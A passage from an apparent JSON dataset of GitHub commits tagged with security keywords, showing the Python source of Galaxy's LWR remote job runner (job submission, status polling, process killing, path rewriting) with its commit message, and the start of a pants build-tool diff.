job_wrapper.job_id) return if not LwrJobRunner.__remote_metadata( client): self._handle_metadata_externally( job_wrapper, resolve_requirements=True) try: job_wrapper.finish( stdout, stderr, exit_code) except Exception: log.exception(\"Job wrapper finish method failed\") job_wrapper.fail(\"Unable to finish job\", exception=True) def fail_job( self, job_state): \"\"\" Seperated out so we can use the worker threads for it. \"\"\" self.stop_job( self.sa_session.query( self.app.model.Job).get( job_state.job_wrapper.job_id)) job_state.job_wrapper.fail( job_state.fail_message) def check_pid( self, pid): try: os.kill( pid, 0) return True except OSError, e: if e.errno==errno.ESRCH: log.debug( \"check_pid(): PID %d is dead\" % pid) else: log.warning( \"check_pid(): Got errno %s when attempting to check PID %d: %s\" %( errno.errorcode[e.errno], pid, e.strerror)) return False def stop_job( self, job): job_ext_output_metadata=job.get_external_output_metadata() if job_ext_output_metadata: pid=job_ext_output_metadata[0].job_runner_external_pid if pid in[ None, '']: log.warning( \"stop_job(): %s: no PID in database for job, unable to stop\" % job.id) return pid=int( pid) if not self.check_pid( pid): log.warning( \"stop_job(): %s: PID %d was already dead or can't be signaled\" %( job.id, pid)) return for sig in[ 15, 9]: try: os.killpg( pid, sig) except OSError, e: log.warning( \"stop_job(): %s: Got errno %s when attempting to signal %d to PID %d: %s\" %( job.id, errno.errorcode[e.errno], sig, pid, e.strerror)) return sleep( 2) if not self.check_pid( pid): log.debug( \"stop_job(): %s: PID %d successfully killed with signal %d\" %( job.id, pid, sig)) return else: log.warning( \"stop_job(): %s: PID %d refuses to die after signaling TERM/KILL\" %( job.id, pid)) else: lwr_url=job.job_runner_name job_id=job.job_runner_external_id log.debug(\"Attempt remote lwr kill of job with url %s and id %s\" %(lwr_url, job_id)) client=self.get_client(job.destination_params, job_id) client.kill() def recover( self, job, job_wrapper): \"\"\"Recovers jobs stuck in the queued/running state when Galaxy started\"\"\" job_state=AsynchronousJobState() job_state.job_id=str( job.get_job_runner_external_id()) job_state.runner_url=job_wrapper.get_job_runner_url() job_state.job_destination=job_wrapper.job_destination job_wrapper.command_line=job.get_command_line() job_state.job_wrapper=job_wrapper state=job.get_state() if state in[model.Job.states.RUNNING, model.Job.states.QUEUED]: log.debug( \"(LWR/%s) is still in running state, adding to the LWR queue\" %( job.get_id())) job_state.old_state=True job_state.running=state==model.Job.states.RUNNING self.monitor_queue.put( job_state) def shutdown( self): super( LwrJobRunner, self).shutdown() self.client_manager.shutdown() def __client_outputs( self, client, job_wrapper): remote_work_dir_copy=LwrJobRunner.__remote_work_dir_copy( client) if not remote_work_dir_copy: work_dir_outputs=self.get_work_dir_outputs( job_wrapper) else: work_dir_outputs=[] output_files=self.get_output_files( job_wrapper) client_outputs=ClientOutputs( working_directory=job_wrapper.working_directory, work_dir_outputs=work_dir_outputs, output_files=output_files, version_file=job_wrapper.get_version_string_path(), ) return client_outputs @staticmethod def __dependencies_description( lwr_client, job_wrapper): dependency_resolution=LwrJobRunner.__dependency_resolution( lwr_client) remote_dependency_resolution=dependency_resolution==\"remote\" if not remote_dependency_resolution: return None requirements=job_wrapper.tool.requirements or[] installed_tool_dependencies=job_wrapper.tool.installed_tool_dependencies or[] return dependencies.DependenciesDescription( requirements=requirements, installed_tool_dependencies=installed_tool_dependencies, ) @staticmethod def __dependency_resolution( lwr_client): dependency_resolution=lwr_client.destination_params.get( \"dependency_resolution\", \"local\") if dependency_resolution not in[\"none\", \"local\", \"remote\"]: raise Exception(\"Unknown dependency_resolution value encountered %s\" % dependency_resolution) return dependency_resolution @staticmethod def __remote_metadata( lwr_client): remote_metadata=string_as_bool_or_none( lwr_client.destination_params.get( \"remote_metadata\", False)) return remote_metadata @staticmethod def __remote_work_dir_copy( lwr_client): return LwrJobRunner.__remote_metadata( lwr_client) @staticmethod def __use_remote_datatypes_conf( lwr_client): \"\"\" When setting remote metadata, use integrated datatypes from this Galaxy instance or use the datatypes config configured via the remote LWR. Both options are broken in different ways for same reason -datatypes may not match. One can push the local datatypes config to the remote server -but there is no guarentee these datatypes will be defined there. Alternatively, one can use the remote datatype config -but there is no guarentee that it will contain all the datatypes available to this Galaxy. \"\"\" use_remote_datatypes=string_as_bool_or_none( lwr_client.destination_params.get( \"use_remote_datatypes\", False)) return use_remote_datatypes @staticmethod def __rewrite_parameters( lwr_client): return string_as_bool_or_none( lwr_client.destination_params.get( \"rewrite_parameters\", False)) or False def __build_metadata_configuration(self, client, job_wrapper, remote_metadata, remote_job_config): metadata_kwds={} if remote_metadata: remote_system_properties=remote_job_config.get(\"system_properties\",{}) remote_galaxy_home=remote_system_properties.get(\"galaxy_home\", None) if not remote_galaxy_home: raise Exception(NO_REMOTE_GALAXY_FOR_METADATA_MESSAGE) metadata_kwds['exec_dir']=remote_galaxy_home outputs_directory=remote_job_config['outputs_directory'] configs_directory=remote_job_config['configs_directory'] working_directory=remote_job_config['working_directory'] outputs=[Bunch(false_path=os.path.join(outputs_directory, os.path.basename(path)), real_path=path) for path in self.get_output_files(job_wrapper)] metadata_kwds['output_fnames']=outputs metadata_kwds['compute_tmp_dir']=working_directory metadata_kwds['config_root']=remote_galaxy_home default_config_file=os.path.join(remote_galaxy_home, 'universe_wsgi.ini') metadata_kwds['config_file']=remote_system_properties.get('galaxy_config_file', default_config_file) metadata_kwds['dataset_files_path']=remote_system_properties.get('galaxy_dataset_files_path', None) if LwrJobRunner.__use_remote_datatypes_conf( client): remote_datatypes_config=remote_system_properties.get('galaxy_datatypes_config_file', None) if not remote_datatypes_config: log.warn(NO_REMOTE_DATATYPES_CONFIG) remote_datatypes_config=os.path.join(remote_galaxy_home, 'datatypes_conf.xml') metadata_kwds['datatypes_config']=remote_datatypes_config else: integrates_datatypes_config=self.app.datatypes_registry.integrated_datatypes_configs job_wrapper.extra_filenames.append(integrates_datatypes_config) metadata_kwds['datatypes_config']=os.path.join(configs_directory, os.path.basename(integrates_datatypes_config)) return metadata_kwds class LwrComputeEnvironment( ComputeEnvironment): def __init__( self, lwr_client, job_wrapper, remote_job_config): self.lwr_client=lwr_client self.job_wrapper=job_wrapper self.local_path_config=job_wrapper.default_compute_environment() self.unstructured_path_rewrites={} self._wrapper_input_paths=self.local_path_config.input_paths() self._wrapper_output_paths=self.local_path_config.output_paths() self.path_mapper=PathMapper(lwr_client, remote_job_config, self.local_path_config.working_directory()) self._config_directory=remote_job_config[ \"configs_directory\"] self._working_directory=remote_job_config[ \"working_directory\"] self._sep=remote_job_config[ \"system_properties\"][ \"separator\"] self._tool_dir=remote_job_config[ \"tools_directory\"] version_path=self.local_path_config.version_path() new_version_path=self.path_mapper.remote_version_path_rewrite(version_path) if new_version_path: version_path=new_version_path self._version_path=version_path def output_paths( self): local_output_paths=self._wrapper_output_paths results=[] for local_output_path in local_output_paths: wrapper_path=str( local_output_path) remote_path=self.path_mapper.remote_output_path_rewrite( wrapper_path) results.append( self._dataset_path( local_output_path, remote_path)) return results def input_paths( self): local_input_paths=self._wrapper_input_paths results=[] for local_input_path in local_input_paths: wrapper_path=str( local_input_path) remote_path=self.path_mapper.remote_input_path_rewrite( wrapper_path) results.append( self._dataset_path( local_input_path, remote_path)) return results def _dataset_path( self, local_dataset_path, remote_path): remote_extra_files_path=None if remote_path: remote_extra_files_path=\"%s_files\" % remote_path[ 0:-len( \".dat\")] return local_dataset_path.with_path_for_job( remote_path, remote_extra_files_path) def working_directory( self): return self._working_directory def config_directory( self): return self._config_directory def new_file_path( self): return self.working_directory() def sep( self): return self._sep def version_path( self): return self._version_path def rewriter( self, parameter_value): unstructured_path_rewrites=self.unstructured_path_rewrites if parameter_value in unstructured_path_rewrites: return unstructured_path_rewrites[ parameter_value] if parameter_value in unstructured_path_rewrites.itervalues(): return parameter_value rewrite, new_unstructured_path_rewrites=self.path_mapper.check_for_arbitrary_rewrite( parameter_value) if rewrite: unstructured_path_rewrites.update(new_unstructured_path_rewrites) return rewrite else: return parameter_value def unstructured_path_rewriter( self): return self.rewriter ", "sourceWithComments": "import logging\n\nfrom galaxy import model\nfrom galaxy.jobs.runners import AsynchronousJobState, AsynchronousJobRunner\nfrom galaxy.jobs import ComputeEnvironment\nfrom galaxy.jobs import JobDestination\nfrom galaxy.jobs.command_factory import build_command\nfrom galaxy.tools.deps import dependencies\nfrom galaxy.util import string_as_bool_or_none\nfrom galaxy.util.bunch import Bunch\n\nimport errno\nfrom time import sleep\nimport os\n\nfrom .lwr_client import build_client_manager\nfrom .lwr_client import url_to_destination_params\nfrom .lwr_client import finish_job as lwr_finish_job\nfrom .lwr_client import submit_job as lwr_submit_job\nfrom .lwr_client import ClientJobDescription\nfrom .lwr_client import LwrOutputs\nfrom .lwr_client import ClientOutputs\nfrom .lwr_client import PathMapper\n\nlog = logging.getLogger( __name__ )\n\n__all__ = [ 'LwrJobRunner' ]\n\nNO_REMOTE_GALAXY_FOR_METADATA_MESSAGE = \"LWR misconfiguration - LWR client configured to set metadata remotely, but remote LWR isn't properly configured with a galaxy_home directory.\"\nNO_REMOTE_DATATYPES_CONFIG = \"LWR client is configured to use remote datatypes configuration when setting metadata externally, but LWR is not configured with this information. Defaulting to datatypes_conf.xml.\"\n\n# Is there a good way to infer some default for this? Can only use\n# url_for from web threads. https://gist.github.com/jmchilton/9098762\nDEFAULT_GALAXY_URL = \"http://localhost:8080\"\n\n\nclass LwrJobRunner( AsynchronousJobRunner ):\n    \"\"\"\n    LWR Job Runner\n    \"\"\"\n    runner_name = \"LWRRunner\"\n\n    def __init__( self, app, nworkers, transport=None, cache=None, url=None, galaxy_url=DEFAULT_GALAXY_URL ):\n        \"\"\"Start the job runner \"\"\"\n        super( LwrJobRunner, self ).__init__( app, nworkers )\n        self.async_status_updates = dict()\n        self._init_monitor_thread()\n        self._init_worker_threads()\n        client_manager_kwargs = {'transport_type': transport, 'cache': string_as_bool_or_none(cache), \"url\": url}\n        self.galaxy_url = galaxy_url\n        self.client_manager = build_client_manager(**client_manager_kwargs)\n\n    def url_to_destination( self, url ):\n        \"\"\"Convert a legacy URL to a job destination\"\"\"\n        return JobDestination( runner=\"lwr\", params=url_to_destination_params( url ) )\n\n    def check_watched_item(self, job_state):\n        try:\n            client = self.get_client_from_state(job_state)\n\n            if hasattr(self.client_manager, 'ensure_has_status_update_callback'):\n                # Message queue implementation.\n\n                # TODO: Very hacky now, refactor after Dannon merges in his\n                # message queue work, runners need the ability to disable\n                # check_watched_item like this and instead a callback needs to\n                # be issued post job recovery allowing a message queue\n                # consumer to be setup.\n                self.client_manager.ensure_has_status_update_callback(self.__async_update)\n                return job_state\n\n            status = client.get_status()\n        except Exception:\n            # An orphaned job was put into the queue at app startup, so remote server went down\n            # either way we are done I guess.\n            self.mark_as_finished(job_state)\n            return None\n        job_state = self.__update_job_state_for_lwr_status(job_state, status)\n        return job_state\n\n    def __update_job_state_for_lwr_status(self, job_state, lwr_status):\n        if lwr_status == \"complete\":\n            self.mark_as_finished(job_state)\n            return None\n        if lwr_status == \"running\" and not job_state.running:\n            job_state.running = True\n            job_state.job_wrapper.change_state( model.Job.states.RUNNING )\n        return job_state\n\n    def __async_update( self, full_status ):\n        job_id = full_status[ \"job_id\" ]\n        job_state = self.__find_watched_job( job_id )\n        if not job_state:\n            # Probably finished too quickly, sleep and try again.\n            # Kind of a hack, why does monitor queue need to no wait\n            # get and sleep instead of doing a busy wait that would\n            # respond immediately.\n            sleep( 2 )\n            job_state = self.__find_watched_job( job_id )\n        if not job_state:\n            log.warn( \"Failed to find job corresponding to final status %s in %s\" % ( full_status, self.watched ) )\n        else:\n            self.__update_job_state_for_lwr_status(job_state, full_status[\"status\"])\n\n    def __find_watched_job( self, job_id ):\n        found_job = None\n        for async_job_state in self.watched:\n            if str( async_job_state.job_id ) == job_id:\n                found_job = async_job_state\n                break\n        return found_job\n\n    def queue_job(self, job_wrapper):\n        job_destination = job_wrapper.job_destination\n\n        command_line, client, remote_job_config, compute_environment = self.__prepare_job( job_wrapper, job_destination )\n\n        if not command_line:\n            return\n\n        try:\n            dependencies_description = LwrJobRunner.__dependencies_description( client, job_wrapper )\n            rewrite_paths = not LwrJobRunner.__rewrite_parameters( client )\n            unstructured_path_rewrites = {}\n            if compute_environment:\n                unstructured_path_rewrites = compute_environment.unstructured_path_rewrites\n\n            client_job_description = ClientJobDescription(\n                command_line=command_line,\n                input_files=self.get_input_files(job_wrapper),\n                client_outputs=self.__client_outputs(client, job_wrapper),\n                working_directory=job_wrapper.working_directory,\n                tool=job_wrapper.tool,\n                config_files=job_wrapper.extra_filenames,\n                dependencies_description=dependencies_description,\n                env=client.env,\n                rewrite_paths=rewrite_paths,\n                arbitrary_files=unstructured_path_rewrites,\n            )\n            job_id = lwr_submit_job(client, client_job_description, remote_job_config)\n            log.info(\"lwr job submitted with job_id %s\" % job_id)\n            job_wrapper.set_job_destination( job_destination, job_id )\n            job_wrapper.change_state( model.Job.states.QUEUED )\n        except Exception:\n            job_wrapper.fail( \"failure running job\", exception=True )\n            log.exception(\"failure running job %d\" % job_wrapper.job_id)\n            return\n\n        lwr_job_state = AsynchronousJobState()\n        lwr_job_state.job_wrapper = job_wrapper\n        lwr_job_state.job_id = job_id\n        lwr_job_state.old_state = True\n        lwr_job_state.running = False\n        lwr_job_state.job_destination = job_destination\n        self.monitor_job(lwr_job_state)\n\n    def __prepare_job(self, job_wrapper, job_destination):\n        \"\"\" Build command-line and LWR client for this job. \"\"\"\n        command_line = None\n        client = None\n        remote_job_config = None\n        compute_environment = None\n        try:\n            client = self.get_client_from_wrapper(job_wrapper)\n            tool = job_wrapper.tool\n            remote_job_config = client.setup(tool.id, tool.version)\n            rewrite_parameters = LwrJobRunner.__rewrite_parameters( client )\n            prepare_kwds = {}\n            if rewrite_parameters:\n                compute_environment = LwrComputeEnvironment( client, job_wrapper, remote_job_config )\n                prepare_kwds[ 'compute_environment' ] = compute_environment\n            job_wrapper.prepare( **prepare_kwds )\n            self.__prepare_input_files_locally(job_wrapper)\n            remote_metadata = LwrJobRunner.__remote_metadata( client )\n            remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )\n            dependency_resolution = LwrJobRunner.__dependency_resolution( client )\n            metadata_kwds = self.__build_metadata_configuration(client, job_wrapper, remote_metadata, remote_job_config)\n            remote_command_params = dict(\n                working_directory=remote_job_config['working_directory'],\n                metadata_kwds=metadata_kwds,\n                dependency_resolution=dependency_resolution,\n            )\n            command_line = build_command(\n                self,\n                job_wrapper=job_wrapper,\n                include_metadata=remote_metadata,\n                include_work_dir_outputs=remote_work_dir_copy,\n                remote_command_params=remote_command_params,\n            )\n        except Exception:\n            job_wrapper.fail( \"failure preparing job\", exception=True )\n            log.exception(\"failure running job %d\" % job_wrapper.job_id)\n\n        # If we were able to get a command line, run the job\n        if not command_line:\n            job_wrapper.finish( '', '' )\n\n        return command_line, client, remote_job_config, compute_environment\n\n    def __prepare_input_files_locally(self, job_wrapper):\n        \"\"\"Run task splitting commands locally.\"\"\"\n        prepare_input_files_cmds = getattr(job_wrapper, 'prepare_input_files_cmds', None)\n        if prepare_input_files_cmds is not None:\n            for cmd in prepare_input_files_cmds:  # run the commands to stage the input files\n                if 0 != os.system(cmd):\n                    raise Exception('Error running file staging command: %s' % cmd)\n            job_wrapper.prepare_input_files_cmds = None  # prevent them from being used in-line\n\n    def get_output_files(self, job_wrapper):\n        output_paths = job_wrapper.get_output_fnames()\n        return [ str( o ) for o in output_paths ]   # Force job_path from DatasetPath objects.\n\n    def get_input_files(self, job_wrapper):\n        input_paths = job_wrapper.get_input_paths()\n        return [ str( i ) for i in input_paths ]  # Force job_path from DatasetPath objects.\n\n    def get_client_from_wrapper(self, job_wrapper):\n        job_id = job_wrapper.job_id\n        if hasattr(job_wrapper, 'task_id'):\n            job_id = \"%s_%s\" % (job_id, job_wrapper.task_id)\n        params = job_wrapper.job_destination.params.copy()\n        for key, value in params.iteritems():\n            if value:\n                params[key] = model.User.expand_user_properties( job_wrapper.get_job().user, value )\n        env = getattr( job_wrapper.job_destination, \"env\", [] )\n        return self.get_client( params, job_id, env )\n\n    def get_client_from_state(self, job_state):\n        job_destination_params = job_state.job_destination.params\n        job_id = job_state.job_id\n        return self.get_client( job_destination_params, job_id )\n\n    def get_client( self, job_destination_params, job_id, env=[] ):\n        # Cannot use url_for outside of web thread.\n        #files_endpoint = url_for( controller=\"job_files\", job_id=encoded_job_id )\n\n        encoded_job_id = self.app.security.encode_id(job_id)\n        job_key = self.app.security.encode_id( job_id, kind=\"jobs_files\" )\n        files_endpoint = \"%s/api/jobs/%s/files?job_key=%s\" % (\n            self.galaxy_url,\n            encoded_job_id,\n            job_key\n        )\n        get_client_kwds = dict(\n            job_id=str( job_id ),\n            files_endpoint=files_endpoint,\n            env=env\n        )\n        return self.client_manager.get_client( job_destination_params, **get_client_kwds )\n\n    def finish_job( self, job_state ):\n        stderr = stdout = ''\n        job_wrapper = job_state.job_wrapper\n        try:\n            client = self.get_client_from_state(job_state)\n            run_results = client.full_status()\n\n            stdout = run_results.get('stdout', '')\n            stderr = run_results.get('stderr', '')\n            exit_code = run_results.get('returncode', None)\n            lwr_outputs = LwrOutputs.from_status_response(run_results)\n            # Use LWR client code to transfer/copy files back\n            # and cleanup job if needed.\n            completed_normally = \\\n                job_wrapper.get_state() not in [ model.Job.states.ERROR, model.Job.states.DELETED ]\n            cleanup_job = self.app.config.cleanup_job\n            client_outputs = self.__client_outputs(client, job_wrapper)\n            finish_args = dict( client=client,\n                                job_completed_normally=completed_normally,\n                                cleanup_job=cleanup_job,\n                                client_outputs=client_outputs,\n                                lwr_outputs=lwr_outputs )\n            failed = lwr_finish_job( **finish_args )\n\n            if failed:\n                job_wrapper.fail(\"Failed to find or download one or more job outputs from remote server.\", exception=True)\n        except Exception:\n            message = \"Failed to communicate with remote job server.\"\n            job_wrapper.fail( message, exception=True )\n            log.exception(\"failure finishing job %d\" % job_wrapper.job_id)\n            return\n        if not LwrJobRunner.__remote_metadata( client ):\n            self._handle_metadata_externally( job_wrapper, resolve_requirements=True )\n        # Finish the job\n        try:\n            job_wrapper.finish( stdout, stderr, exit_code )\n        except Exception:\n            log.exception(\"Job wrapper finish method failed\")\n            job_wrapper.fail(\"Unable to finish job\", exception=True)\n\n    def fail_job( self, job_state ):\n        \"\"\"\n        Seperated out so we can use the worker threads for it.\n        \"\"\"\n        self.stop_job( self.sa_session.query( self.app.model.Job ).get( job_state.job_wrapper.job_id ) )\n        job_state.job_wrapper.fail( job_state.fail_message )\n\n    def check_pid( self, pid ):\n        try:\n            os.kill( pid, 0 )\n            return True\n        except OSError, e:\n            if e.errno == errno.ESRCH:\n                log.debug( \"check_pid(): PID %d is dead\" % pid )\n            else:\n                log.warning( \"check_pid(): Got errno %s when attempting to check PID %d: %s\" % ( errno.errorcode[e.errno], pid, e.strerror ) )\n            return False\n\n    def stop_job( self, job ):\n        #if our local job has JobExternalOutputMetadata associated, then our primary job has to have already finished\n        job_ext_output_metadata = job.get_external_output_metadata()\n        if job_ext_output_metadata:\n            pid = job_ext_output_metadata[0].job_runner_external_pid  # every JobExternalOutputMetadata has a pid set, we just need to take from one of them\n            if pid in [ None, '' ]:\n                log.warning( \"stop_job(): %s: no PID in database for job, unable to stop\" % job.id )\n                return\n            pid = int( pid )\n            if not self.check_pid( pid ):\n                log.warning( \"stop_job(): %s: PID %d was already dead or can't be signaled\" % ( job.id, pid ) )\n                return\n            for sig in [ 15, 9 ]:\n                try:\n                    os.killpg( pid, sig )\n                except OSError, e:\n                    log.warning( \"stop_job(): %s: Got errno %s when attempting to signal %d to PID %d: %s\" % ( job.id, errno.errorcode[e.errno], sig, pid, e.strerror ) )\n                    return  # give up\n                sleep( 2 )\n                if not self.check_pid( pid ):\n                    log.debug( \"stop_job(): %s: PID %d successfully killed with signal %d\" % ( job.id, pid, sig ) )\n                    return\n                else:\n                    log.warning( \"stop_job(): %s: PID %d refuses to die after signaling TERM/KILL\" % ( job.id, pid ) )\n        else:\n            # Remote kill\n            lwr_url = job.job_runner_name\n            job_id = job.job_runner_external_id\n            log.debug(\"Attempt remote lwr kill of job with url %s and id %s\" % (lwr_url, job_id))\n            client = self.get_client(job.destination_params, job_id)\n            client.kill()\n\n    def recover( self, job, job_wrapper ):\n        \"\"\"Recovers jobs stuck in the queued/running state when Galaxy started\"\"\"\n        job_state = AsynchronousJobState()\n        job_state.job_id = str( job.get_job_runner_external_id() )\n        job_state.runner_url = job_wrapper.get_job_runner_url()\n        job_state.job_destination = job_wrapper.job_destination\n        job_wrapper.command_line = job.get_command_line()\n        job_state.job_wrapper = job_wrapper\n        state = job.get_state()\n        if state in [model.Job.states.RUNNING, model.Job.states.QUEUED]:\n            log.debug( \"(LWR/%s) is still in running state, adding to the LWR queue\" % ( job.get_id()) )\n            job_state.old_state = True\n            job_state.running = state == model.Job.states.RUNNING\n            self.monitor_queue.put( job_state )\n\n    def shutdown( self ):\n        super( LwrJobRunner, self ).shutdown()\n        self.client_manager.shutdown()\n\n    def __client_outputs( self, client, job_wrapper ):\n        remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )\n        if not remote_work_dir_copy:\n            work_dir_outputs = self.get_work_dir_outputs( job_wrapper )\n        else:\n            # They have already been copied over to look like regular outputs remotely,\n            # no need to handle them differently here.\n            work_dir_outputs = []\n        output_files = self.get_output_files( job_wrapper )\n        client_outputs = ClientOutputs(\n            working_directory=job_wrapper.working_directory,\n            work_dir_outputs=work_dir_outputs,\n            output_files=output_files,\n            version_file=job_wrapper.get_version_string_path(),\n        )\n        return client_outputs\n\n    @staticmethod\n    def __dependencies_description( lwr_client, job_wrapper ):\n        dependency_resolution = LwrJobRunner.__dependency_resolution( lwr_client )\n        remote_dependency_resolution = dependency_resolution == \"remote\"\n        if not remote_dependency_resolution:\n            return None\n        requirements = job_wrapper.tool.requirements or []\n        installed_tool_dependencies = job_wrapper.tool.installed_tool_dependencies or []\n        return dependencies.DependenciesDescription(\n            requirements=requirements,\n            installed_tool_dependencies=installed_tool_dependencies,\n        )\n\n    @staticmethod\n    def __dependency_resolution( lwr_client ):\n        dependency_resolution = lwr_client.destination_params.get( \"dependency_resolution\", \"local\" )\n        if dependency_resolution not in [\"none\", \"local\", \"remote\"]:\n            raise Exception(\"Unknown dependency_resolution value encountered %s\" % dependency_resolution)\n        return dependency_resolution\n\n    @staticmethod\n    def __remote_metadata( lwr_client ):\n        remote_metadata = string_as_bool_or_none( lwr_client.destination_params.get( \"remote_metadata\", False ) )\n        return remote_metadata\n\n    @staticmethod\n    def __remote_work_dir_copy( lwr_client ):\n        # Right now remote metadata handling assumes from_work_dir outputs\n        # have been copied over before it runs. So do that remotely. This is\n        # not the default though because adding it to the command line is not\n        # cross-platform (no cp on Windows) and it's un-needed work outside\n        # the context of metadata settting (just as easy to download from\n        # either place.)\n        return LwrJobRunner.__remote_metadata( lwr_client )\n\n    @staticmethod\n    def __use_remote_datatypes_conf( lwr_client ):\n        \"\"\" When setting remote metadata, use integrated datatypes from this\n        Galaxy instance or use the datatypes config configured via the remote\n        LWR.\n\n        Both options are broken in different ways for same reason - datatypes\n        may not match. One can push the local datatypes config to the remote\n        server - but there is no guarentee these datatypes will be defined\n        there. Alternatively, one can use the remote datatype config - but\n        there is no guarentee that it will contain all the datatypes available\n        to this Galaxy.\n        \"\"\"\n        use_remote_datatypes = string_as_bool_or_none( lwr_client.destination_params.get( \"use_remote_datatypes\", False ) )\n        return use_remote_datatypes\n\n    @staticmethod\n    def __rewrite_parameters( lwr_client ):\n        return string_as_bool_or_none( lwr_client.destination_params.get( \"rewrite_parameters\", False ) ) or False\n\n    def __build_metadata_configuration(self, client, job_wrapper, remote_metadata, remote_job_config):\n        metadata_kwds = {}\n        if remote_metadata:\n            remote_system_properties = remote_job_config.get(\"system_properties\", {})\n            remote_galaxy_home = remote_system_properties.get(\"galaxy_home\", None)\n            if not remote_galaxy_home:\n                raise Exception(NO_REMOTE_GALAXY_FOR_METADATA_MESSAGE)\n            metadata_kwds['exec_dir'] = remote_galaxy_home\n            outputs_directory = remote_job_config['outputs_directory']\n            configs_directory = remote_job_config['configs_directory']\n            working_directory = remote_job_config['working_directory']\n            outputs = [Bunch(false_path=os.path.join(outputs_directory, os.path.basename(path)), real_path=path) for path in self.get_output_files(job_wrapper)]\n            metadata_kwds['output_fnames'] = outputs\n            metadata_kwds['compute_tmp_dir'] = working_directory\n            metadata_kwds['config_root'] = remote_galaxy_home\n            default_config_file = os.path.join(remote_galaxy_home, 'universe_wsgi.ini')\n            metadata_kwds['config_file'] = remote_system_properties.get('galaxy_config_file', default_config_file)\n            metadata_kwds['dataset_files_path'] = remote_system_properties.get('galaxy_dataset_files_path', None)\n            if LwrJobRunner.__use_remote_datatypes_conf( client ):\n                remote_datatypes_config = remote_system_properties.get('galaxy_datatypes_config_file', None)\n                if not remote_datatypes_config:\n                    log.warn(NO_REMOTE_DATATYPES_CONFIG)\n                    remote_datatypes_config = os.path.join(remote_galaxy_home, 'datatypes_conf.xml')\n                metadata_kwds['datatypes_config'] = remote_datatypes_config\n            else:\n                integrates_datatypes_config = self.app.datatypes_registry.integrated_datatypes_configs\n                # Ensure this file gets pushed out to the remote config dir.\n                job_wrapper.extra_filenames.append(integrates_datatypes_config)\n\n                metadata_kwds['datatypes_config'] = os.path.join(configs_directory, os.path.basename(integrates_datatypes_config))\n        return metadata_kwds\n\n\nclass LwrComputeEnvironment( ComputeEnvironment ):\n\n    def __init__( self, lwr_client, job_wrapper, remote_job_config ):\n        self.lwr_client = lwr_client\n        self.job_wrapper = job_wrapper\n        self.local_path_config = job_wrapper.default_compute_environment()\n        self.unstructured_path_rewrites = {}\n        # job_wrapper.prepare is going to expunge the job backing the following\n        # computations, so precalculate these paths.\n        self._wrapper_input_paths = self.local_path_config.input_paths()\n        self._wrapper_output_paths = self.local_path_config.output_paths()\n        self.path_mapper = PathMapper(lwr_client, remote_job_config, self.local_path_config.working_directory())\n        self._config_directory = remote_job_config[ \"configs_directory\" ]\n        self._working_directory = remote_job_config[ \"working_directory\" ]\n        self._sep = remote_job_config[ \"system_properties\" ][ \"separator\" ]\n        self._tool_dir = remote_job_config[ \"tools_directory\" ]\n        version_path = self.local_path_config.version_path()\n        new_version_path = self.path_mapper.remote_version_path_rewrite(version_path)\n        if new_version_path:\n            version_path = new_version_path\n        self._version_path = version_path\n\n    def output_paths( self ):\n        local_output_paths = self._wrapper_output_paths\n\n        results = []\n        for local_output_path in local_output_paths:\n            wrapper_path = str( local_output_path )\n            remote_path = self.path_mapper.remote_output_path_rewrite( wrapper_path )\n            results.append( self._dataset_path( local_output_path, remote_path ) )\n        return results\n\n    def input_paths( self ):\n        local_input_paths = self._wrapper_input_paths\n\n        results = []\n        for local_input_path in local_input_paths:\n            wrapper_path = str( local_input_path )\n            # This will over-copy in some cases. For instance in the case of task\n            # splitting, this input will be copied even though only the work dir\n            # input will actually be used.\n            remote_path = self.path_mapper.remote_input_path_rewrite( wrapper_path )\n            results.append( self._dataset_path( local_input_path, remote_path ) )\n        return results\n\n    def _dataset_path( self, local_dataset_path, remote_path ):\n        remote_extra_files_path = None\n        if remote_path:\n            remote_extra_files_path = \"%s_files\" % remote_path[ 0:-len( \".dat\" ) ]\n        return local_dataset_path.with_path_for_job( remote_path, remote_extra_files_path )\n\n    def working_directory( self ):\n        return self._working_directory\n\n    def config_directory( self ):\n        return self._config_directory\n\n    def new_file_path( self ):\n        return self.working_directory()  # Problems with doing this?\n\n    def sep( self ):\n        return self._sep\n\n    def version_path( self ):\n        return self._version_path\n\n    def rewriter( self, parameter_value ):\n        unstructured_path_rewrites = self.unstructured_path_rewrites\n        if parameter_value in unstructured_path_rewrites:\n            # Path previously mapped, use previous mapping.\n            return unstructured_path_rewrites[ parameter_value ]\n        if parameter_value in unstructured_path_rewrites.itervalues():\n            # Path is a rewritten remote path (this might never occur,\n            # consider dropping check...)\n            return parameter_value\n\n        rewrite, new_unstructured_path_rewrites = self.path_mapper.check_for_arbitrary_rewrite( parameter_value )\n        if rewrite:\n            unstructured_path_rewrites.update(new_unstructured_path_rewrites)\n            return rewrite\n        else:\n            # Did need to rewrite, use original path or value.\n            return parameter_value\n\n    def unstructured_path_rewriter( self ):\n        return self.rewriter\n"}}, "msg": "Optimize/correct LWR remote metadata generation for working directory outputs.\nPreviously I was attempting to mimic Galaxy's behavior of copying these files to a fixed output location after execution on the remote server before setting metadata. This was an un-needed copy since it appears to easier to just send the metadata generation code the expected path on the working directory."}}, "https://github.com/fakeNetflix/twitter-repo-pants": {"8e340d8fceb6191e581cd10498742bbeea8a24ab": {"url": "https://api.github.com/repos/fakeNetflix/twitter-repo-pants/commits/8e340d8fceb6191e581cd10498742bbeea8a24ab", "html_url": "https://github.com/fakeNetflix/twitter-repo-pants/commit/8e340d8fceb6191e581cd10498742bbeea8a24ab", "sha": "8e340d8fceb6191e581cd10498742bbeea8a24ab", "keyword": "remote code execution issue", "diff": "diff --git a/src/python/pants/backend/graph_info/tasks/cloc.py b/src/python/pants/backend/graph_info/tasks/cloc.py\nindex 1cc6333fe..6019ef337 100644\n--- a/src/python/pants/backend/graph_info/tasks/cloc.py\n+++ b/src/python/pants/backend/graph_info/tasks/cloc.py\n@@ -80,7 +80,7 @@ def console_output(self, targets):\n       output_files=('ignored', 'report'),\n       description='cloc',\n     )\n-    exec_result = self.context.execute_process_synchronously(req, 'cloc', (WorkUnitLabel.TOOL,))\n+    exec_result = self.context.execute_process_synchronously_without_raising(req, 'cloc', (WorkUnitLabel.TOOL,))\n \n     files_content_tuple = self.context._scheduler.product_request(\n       FilesContent,\ndiff --git a/src/python/pants/backend/jvm/subsystems/scala_platform.py b/src/python/pants/backend/jvm/subsystems/scala_platform.py\nindex 8e3bed8c5..f3b5bbd7c 100644\n--- 